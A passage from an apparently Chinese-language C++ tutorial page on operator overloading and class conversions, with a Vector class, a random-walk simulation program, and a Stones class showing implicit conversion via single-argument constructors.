class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\vector.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt; // 为了使用 sqrt, atan, atan2, sin, cos</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;vector.h&quot;</span> <span class="comment">// 包含类定义</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> VECTOR &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 角度转换常量 (如果 cmath 没有定义 M_PI)</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">double</span> Rad_to_deg = <span class="number">180.0</span> / <span class="number">3.141592653589793</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- 私有辅助函数 ---</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Vector::set_mag</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mag = <span class="built_in">std</span>::<span class="built_in">sqrt</span>(x * x + y * y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Vector::set_ang</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (x == <span class="number">0.0</span> &amp;&amp; y == <span class="number">0.0</span>)</span><br><span class="line">            ang = <span class="number">0.0</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            ang = <span class="built_in">std</span>::<span class="built_in">atan2</span>(y, x); <span class="comment">// atan2 处理所有象限</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Vector::set_x</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        x = mag * <span class="built_in">std</span>::<span class="built_in">cos</span>(ang);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Vector::set_y</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        y = mag * <span class="built_in">std</span>::<span class="built_in">sin</span>(ang);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- 公有方法 ---</span></span><br><span class="line">    Vector::Vector() &#123; <span class="comment">// 默认构造函数</span></span><br><span class="line">        x = y = mag = ang = <span class="number">0.0</span>;</span><br><span class="line">        mode = RECT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 根据模式构造</span></span><br><span class="line">    Vector::Vector(<span class="keyword">double</span> n1, <span class="keyword">double</span> n2, Mode form) &#123;</span><br><span class="line">        mode = form;</span><br><span class="line">        <span class="keyword">if</span> (form == RECT) &#123;</span><br><span class="line">            x = n1;</span><br><span class="line">            y = n2;</span><br><span class="line">            set_mag();</span><br><span class="line">            set_ang();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (form == POL) &#123;</span><br><span class="line">            mag = n1;</span><br><span class="line">            ang = n2 / Rad_to_deg; <span class="comment">// 将角度转换为弧度</span></span><br><span class="line">            set_x();</span><br><span class="line">            set_y();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Incorrect 3rd argument to Vector() -- &quot;</span>;</span><br><span class="line">            <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;vector set to 0\n&quot;</span>;</span><br><span class="line">            x = y = mag = ang = <span class="number">0.0</span>;</span><br><span class="line">            mode = RECT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 重置矢量</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Vector::reset</span><span class="params">(<span class="keyword">double</span> n1, <span class="keyword">double</span> n2, Mode form)</span> </span>&#123;</span><br><span class="line">        mode = form;</span><br><span class="line">        <span class="keyword">if</span> (form == RECT) &#123;</span><br><span class="line">            x = n1;</span><br><span class="line">            y = n2;</span><br><span class="line">            set_mag();</span><br><span class="line">            set_ang();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (form == POL) &#123;</span><br><span class="line">            mag = n1;</span><br><span class="line">            ang = n2 / Rad_to_deg; <span class="comment">// 角度转弧度</span></span><br><span class="line">            set_x();</span><br><span class="line">            set_y();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Incorrect 3rd argument to Vector::reset() -- &quot;</span>;</span><br><span class="line">             <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;vector set to 0\n&quot;</span>;</span><br><span class="line">             x = y = mag = ang = <span class="number">0.0</span>;</span><br><span class="line">             mode = RECT;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Vector::~Vector() &#123; <span class="comment">// 析构函数</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Vector::polar_mode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mode = POL;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Vector::rect_mode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        mode = RECT;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- 运算符重载实现 ---</span></span><br><span class="line">    <span class="comment">// 加法 (通常在直角坐标下计算)</span></span><br><span class="line">    Vector Vector::<span class="keyword">operator</span>+(<span class="keyword">const</span> Vector &amp; b) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Vector(x + b.x, y + b.y); <span class="comment">// 返回一个新的 Vector 对象</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 减法</span></span><br><span class="line">    Vector Vector::<span class="keyword">operator</span>-(<span class="keyword">const</span> Vector &amp; b) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Vector(x - b.x, y - b.y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 取反</span></span><br><span class="line">    Vector Vector::<span class="keyword">operator</span>-() <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Vector(-x, -y);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 乘法 (Vector * double)</span></span><br><span class="line">    Vector Vector::<span class="keyword">operator</span>*(<span class="keyword">double</span> n) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> Vector(x * n, y * n);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// --- 友元函数实现 ---</span></span><br><span class="line">    <span class="comment">// 乘法 (double * Vector)</span></span><br><span class="line">    Vector <span class="keyword">operator</span>*(<span class="keyword">double</span> n, <span class="keyword">const</span> Vector &amp; a) &#123;</span><br><span class="line">        <span class="keyword">return</span> a * n; <span class="comment">// 调用成员函数 a.operator*(n)</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 输出 (根据模式选择输出格式)</span></span><br><span class="line">    <span class="built_in">std</span>::ostream &amp; <span class="keyword">operator</span>&lt;&lt;(<span class="built_in">std</span>::ostream &amp; os, <span class="keyword">const</span> Vector &amp; v) &#123;</span><br><span class="line">        <span class="keyword">if</span> (v.mode == Vector::RECT) &#123;</span><br><span class="line">            os &lt;&lt; <span class="string">&quot;(x,y) = (&quot;</span> &lt;&lt; v.x &lt;&lt; <span class="string">&quot;, &quot;</span> &lt;&lt; v.y &lt;&lt; <span class="string">&quot;)&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (v.mode == Vector::POL) &#123;</span><br><span class="line">            os &lt;&lt; <span class="string">&quot;(m,a) = (&quot;</span> &lt;&lt; v.mag &lt;&lt; <span class="string">&quot;, &quot;</span></span><br><span class="line">               &lt;&lt; v.ang * Rad_to_deg &lt;&lt; <span class="string">&quot;)&quot;</span>; <span class="comment">// 输出角度</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            os &lt;&lt; <span class="string">&quot;Vector object mode is invalid&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> os;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; <span class="comment">// end namespace VECTOR</span></span><br></pre></td></tr></table></figure><h3 id="11-5-2-为-Vector-类重载算术运算符"><a href="#11-5-2-为-Vector-类重载算术运算符" class="headerlink" title="11.5.2 为 Vector 类重载算术运算符"></a>11.5.2 为 Vector 类重载算术运算符</h3><p>我们在上面的代码中已经实现了几个运算符的重载：</p><ul><li>  <code>operator+</code>: 两个 <code>Vector</code> 相加，返回一个新的 <code>Vector</code>。计算在直角坐标下进行。</li><li>  <code>operator-</code>: 两个 <code>Vector</code> 相减，返回一个新的 <code>Vector</code>。</li><li>  <code>operator-</code> (一元): 对 <code>Vector</code> 取反，返回一个新的 <code>Vector</code>。</li><li>  <code>operator*</code>: <code>Vector</code> 乘以一个 <code>double</code>，返回一个新的 <code>Vector</code>。</li><li>  <code>operator*</code> (友元): <code>double</code> 乘以一个 <code>Vector</code>，通过调用成员函数版本实现。</li><li>  <code>operator&lt;&lt;</code> (友元): 将 <code>Vector</code> 输出到 <code>ostream</code>，根据当前模式选择输出格式。</li></ul><h3 id="11-5-3-对实现的说明"><a href="#11-5-3-对实现的说明" class="headerlink" title="11.5.3 对实现的说明"></a>11.5.3 对实现的说明</h3><ul><li>  <strong>命名空间:</strong> 将 <code>Vector</code> 类及其相关函数放入 <code>VECTOR</code> 命名空间，以避免潜在的名称冲突。</li><li>  <strong>坐标计算:</strong> 算术运算（加、减、乘）通常在直角坐标下执行更简单。即使对象是以极坐标模式创建或设置的，内部的 <code>x</code> 和 <code>y</code> 值也会被计算出来，运算基于这些值进行。结果对象默认以直角坐标模式创建，但其 <code>mag</code> 和 <code>ang</code> 也会被计算。</li><li>  <strong>角度单位:</strong> 内部计算（如 <code>sin</code>, <code>cos</code>, <code>atan2</code>）使用<strong>弧度</strong>。构造函数和 <code>reset</code> 接受角度值（如果是极坐标模式），并将其转换为弧度存储。<code>angval()</code> 和 <code>operator&lt;&lt;</code> 在显示时将内部的弧度转换回<strong>角度</strong>。</li><li>  <strong>友元函数:</strong> <code>operator*</code> (double * Vector) 和 <code>operator&lt;&lt;</code> 被实现为友元函数，原因与 <code>Time</code> 类中的类似：<code>operator*</code> 需要处理 <code>double</code> 作为左操作数的情况，<code>operator&lt;&lt;</code> 需要 <code>ostream</code> 作为左操作数，并且它们都需要访问 <code>Vector</code> 的私有成员。</li></ul><h3 id="11-5-4-使用-Vector-类来模拟随机漫步"><a href="#11-5-4-使用-Vector-类来模拟随机漫步" class="headerlink" title="11.5.4 使用 Vector 类来模拟随机漫步"></a>11.5.4 使用 Vector 类来模拟随机漫步</h3><p>现在我们可以使用 <code>Vector</code> 类来模拟一个简单的物理过程：随机漫步。假设一个人从原点出发，每次随机选择一个方向行走固定的一段距离，重复多次，我们想知道他最终的位置。</p><p><strong>randwalk.cpp (主程序)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// filepath: d:\ProgramData\files_Cpp\250424\randwalk.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;    // 提供 rand(), srand() 原型</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctime&gt;      // 提供 time() 原型</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;vector.h&quot;</span>   <span class="comment">// 包含 Vector 类定义 (假设在同一目录或包含路径中)</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line">    <span class="keyword">using</span> VECTOR::Vector; <span class="comment">// 使用 VECTOR 命名空间中的 Vector</span></span><br><span class="line"></span><br><span class="line">    srand(time(<span class="number">0</span>)); <span class="comment">// 初始化随机数生成器</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">double</span> direction;</span><br><span class="line">    Vector step;      <span class="comment">// 当前一步的矢量</span></span><br><span class="line">    <span class="function">Vector <span class="title">result</span><span class="params">(<span class="number">0.0</span>, <span class="number">0.0</span>)</span></span>; <span class="comment">// 从原点开始的总位移</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> steps = <span class="number">0</span>; <span class="comment">// 总步数</span></span><br><span class="line">    <span class="keyword">double</span> target;    <span class="comment">// 目标距离</span></span><br><span class="line">    <span class="keyword">double</span> dstep;     <span class="comment">// 每步的距离</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter target distance (q to quit): &quot;</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; target) &#123; <span class="comment">// 循环直到输入非数字</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter step length: &quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (!(<span class="built_in">cin</span> &gt;&gt; dstep))</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">// 如果步长输入无效则退出</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Target Distance: &quot;</span> &lt;&lt; target &lt;&lt; <span class="string">&quot;, Step Size: &quot;</span> &lt;&lt; dstep &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; steps &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; result &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 输出初始位置</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 开始随机漫步</span></span><br><span class="line">        <span class="keyword">while</span> (result.magval() &lt; target) &#123; <span class="comment">// 只要还没达到目标距离</span></span><br><span class="line">            direction = rand() % <span class="number">360</span>; <span class="comment">// 随机生成 0-359 度的方向</span></span><br><span class="line">            step.reset(dstep, direction, Vector::POL); <span class="comment">// 设置当前步的矢量 (极坐标)</span></span><br><span class="line">            result = result + step; <span class="comment">// 将当前步加到总位移上</span></span><br><span class="line">            steps++;</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; steps &lt;&lt; <span class="string">&quot;: &quot;</span> &lt;&lt; result &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 输出当前位置</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 输出最终结果</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After &quot;</span> &lt;&lt; steps &lt;&lt; <span class="string">&quot; steps, the subject &quot;</span></span><br><span class="line">                <span class="string">&quot;has the following location:\n&quot;</span>;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; result &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 输出最终位置 (默认直角坐标)</span></span><br><span class="line">        result.polar_mode(); <span class="comment">// 切换到极坐标模式</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot; or\n&quot;</span> &lt;&lt; result &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 输出最终位置 (极坐标)</span></span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Average outward distance per step = &quot;</span></span><br><span class="line">             &lt;&lt; result.magval() / steps &lt;&lt; <span class="built_in">endl</span>; <span class="comment">// 计算平均每步移动的直线距离</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 重置以便下一次模拟</span></span><br><span class="line">        steps = <span class="number">0</span>;</span><br><span class="line">        result.reset(<span class="number">0.0</span>, <span class="number">0.0</span>);</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;\nEnter target distance (q to quit): &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bye!\n&quot;</span>;</span><br><span class="line">    <span class="built_in">cin</span>.clear(); <span class="comment">// 清除可能的错误状态</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span>.get() != <span class="string">&#x27;\n&#x27;</span>) <span class="comment">// 清空输入缓冲区</span></span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>编译和运行:</strong></p><p>你需要将 <code>vector.cpp</code> 和 <code>randwalk.cpp</code> 一起编译链接。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">g++ randwalk.cpp vector.cpp -o randwalk -lm <span class="comment"># 可能需要链接数学库 (-lm)</span></span><br><span class="line">./randwalk</span><br></pre></td></tr></table></figure><p>程序会提示你输入目标距离和每步的长度，然后模拟随机漫步过程，打印每一步后的位置，直到达到目标距离，最后输出总结信息。这个例子很好地展示了如何利用运算符重载使类的使用（如 <code>result = result + step;</code>）变得直观和方便。</p><h2 id="11-6-类的自动转换和强制类型转换"><a href="#11-6-类的自动转换和强制类型转换" class="headerlink" title="11.6 类的自动转换和强制类型转换"></a>11.6 类的自动转换和强制类型转换</h2><p>C++ 是一种强类型语言，但它也允许在不同类型之间进行转换。我们已经熟悉了内置类型之间的转换（例如 <code>int</code> 到 <code>double</code>）。C++ 也允许定义类类型与其它类型（包括内置类型和其他类类型）之间的转换规则。这种转换可以是自动（隐式）发生的，也可以是需要显式请求的（强制类型转换）。</p><h3 id="11-6-1-隐式转换：使用构造函数"><a href="#11-6-1-隐式转换：使用构造函数" class="headerlink" title="11.6.1 隐式转换：使用构造函数"></a>11.6.1 隐式转换：使用构造函数</h3><p>如果一个类的<strong>构造函数</strong>可以用<strong>单个参数</strong>来调用（要么它只有一个参数，要么它有多个参数但第一个参数之后的所有参数都有默认值），那么这个构造函数就定义了一个从其参数类型到该类类型的<strong>隐式转换规则</strong>。</p><p><strong>示例：</strong></p><p>假设我们有一个简单的 <code>Stones</code> 类，表示英石（一种重量单位），并且我们想允许从 <code>double</code>（表示磅）自动转换为 <code>Stones</code>。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// stones.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> STONES_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STONES_H_</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Stones</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="class"><span class="keyword">enum</span> &#123;</span> Lbs_per_stn = <span class="number">14</span> &#125;; <span class="comment">// 每英石包含的磅数</span></span><br><span class="line">    <span class="keyword">int</span> stone;      <span class="comment">// 整数部分的英石</span></span><br><span class="line">    <span class="keyword">double</span> pds_left; <span class="comment">// 剩余的小数磅数</span></span><br><span class="line">    <span class="keyword">double</span> pounds;   <span class="comment">// 总磅数</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">// 构造函数：接受总磅数 (double)</span></span><br><span class="line">    Stones(<span class="keyword">double</span> lbs);</span><br><span class="line">    <span class="comment">// 默认构造函数</span></span><br><span class="line">    Stones();</span><br><span class="line">    ~Stones();</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show_lbs</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// 以磅显示</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">show_stn</span><span class="params">()</span> <span class="keyword">const</span></span>; <span class="comment">// 以英石格式显示</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// STONES_H_</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// stones.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stones.h&quot;</span></span></span><br><span class="line"></span><br><span class="line">Stones::Stones(<span class="keyword">double</span> lbs) &#123;</span><br><span class="line">    pounds = lbs;</span><br><span class="line">    stone = <span class="keyword">int</span>(lbs) / Lbs_per_stn; <span class="comment">// 整数英石</span></span><br><span class="line">    pds_left = <span class="keyword">int</span>(lbs) % Lbs_per_stn + lbs - <span class="keyword">int</span>(lbs); <span class="comment">// 剩余磅数</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Stones::Stones() &#123;</span><br><span class="line">    stone = pounds = pds_left = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Stones::~Stones() &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stones::show_lbs</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; pounds &lt;&lt; <span class="string">&quot; pounds\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Stones::show_stn</span><span class="params">()</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; stone &lt;&lt; <span class="string">&quot; stone, &quot;</span> &lt;&lt; pds_left &lt;&lt; <span class="string">&quot; pounds\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stones.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(<span class="keyword">const</span> Stones &amp; st, <span class="keyword">int</span> n)</span></span>; <span class="comment">// 函数接受 Stones 对象</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Stones incognito = <span class="number">275</span>; <span class="comment">// 隐式转换: 调用 Stones(275.0)</span></span><br><span class="line">    <span class="function">Stones <span class="title">wolfe</span><span class="params">(<span class="number">285.7</span>)</span></span>;    <span class="comment">// 显式调用构造函数</span></span><br><span class="line">    Stones taft = <span class="number">325</span>;      <span class="comment">// 隐式转换: 调用 Stones(325.0)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Incognito weighs &quot;</span>;</span><br><span class="line">    incognito.show_stn();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Wolfe weighs &quot;</span>;</span><br><span class="line">    wolfe.show_stn();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Taft weighs &quot;</span>;</span><br><span class="line">    taft.show_stn();</span><br><span class="line"></span><br><span class="line">    incognito = <span class="number">276.8</span>; <span class="comment">// 隐式转换: 调用 Stones(276.8), 然后赋值</span></span><br><span class="line">    taft = Stones(<span class="number">330</span>); <span class="comment">// 显式转换 (调用构造函数)</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After dinner, Incognito weighs &quot;</span>;</span><br><span class="line">    incognito.show_stn();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After dinner, Taft weighs &quot;</span>;</span><br><span class="line">    taft.show_stn();</span><br><span class="line"></span><br><span class="line">    display(<span class="number">19.99</span>, <span class="number">2</span>); <span class="comment">// 隐式转换: 19.99 转换为临时 Stones 对象传递给函数</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">display</span><span class="params">(<span class="keyword">const</span> Stones &amp; st, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Wow! &quot;</span>;</span><br><span class="line">        st.show_stn();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 <code>main</code> 函数中：</p><ul><li>  <code>Stones incognito = 275;</code> 和 <code>Stones taft = 325;</code>：整数 <code>275</code> 和 <code>325</code> 首先被提升为 <code>double</code>，然后编译器使用 <code>Stones(double)</code> 构造函数创建了一个临时的 <code>Stones</code> 对象，并用这个临时对象来初始化 <code>incognito</code> 和 <code>taft</code>（在现代 C++ 中，这通常会被优化，直接在目标对象上构造，称为复制省略）。</li><li>  <code>incognito = 276.8;</code>：<code>double</code> 值 <code>276.8</code> 被用来创建一个临时的 <code>Stones</code> 对象，然后该临时对象通过赋值运算符（这里是默认的赋值运算符）赋给 <code>incognito</code>。</li><li>  <code>display(19.99, 2);</code>：<code>double</code> 值 <code>19.99</code> 被用来创建一个临时的 <code>Stones</code> 对象，这个临时对象作为参数传递给 <code>display</code> 函数。</li></ul><p>这种隐式转换有时很方便，但也可能导致意想不到的行为或错误，特别是当转换不是程序员的本意时。</p><p><strong>使用 <code>explicit</code> 